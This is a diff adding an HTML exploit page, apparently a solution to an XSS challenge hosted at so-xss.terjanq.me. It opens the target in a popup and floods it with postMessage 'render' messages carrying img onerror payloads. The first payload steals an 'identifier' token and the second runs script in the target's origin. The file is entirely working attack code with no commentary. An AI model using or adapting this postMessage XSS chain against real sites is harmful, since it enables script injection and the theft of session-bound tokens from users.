@@ -1,0 +1,34 @@
+
+<body>
+<script>
+f=document.createElement("iframe");
+f.sandbox = "allow-popups allow-scripts";
+f.srcdoc = `<script>
+function gg(){
+   x = window.open('https://so-xss.terjanq.me/iframe.php');
+   setInterval(()=>{
+      x.postMessage({type:"render",body:"<img src=1 onerror=opener.postMessage({identifier},'*')>"},"*")
+   },100)
+}
+onmessage = e=>{
+    if(e.data.identifier){
+        x.close()
+        top.postMessage(e.data,'*')
+    }
+}
+<\/script>
+<button onclick=gg()>click me!</button>`;
+document.body.appendChild(f)
+onmessage = e=>{
+   if(e.data.identifier){
+        window.iden = e.data.identifier
+        window.fo = ()=>{
+            x = window.open('https://so-xss.terjanq.me/iframe.php');
+            setInterval(()=>x.postMessage({type:"render",identifier:window.iden,body:"<img src=1 onerror=alert(document.domain)>"},"*"),500)
+        }
+
+        document.body.innerHTML = `<button onclick="window.fo()">NOW CLICK ME!</button>`
+   }
+}
+</script>
+</body>
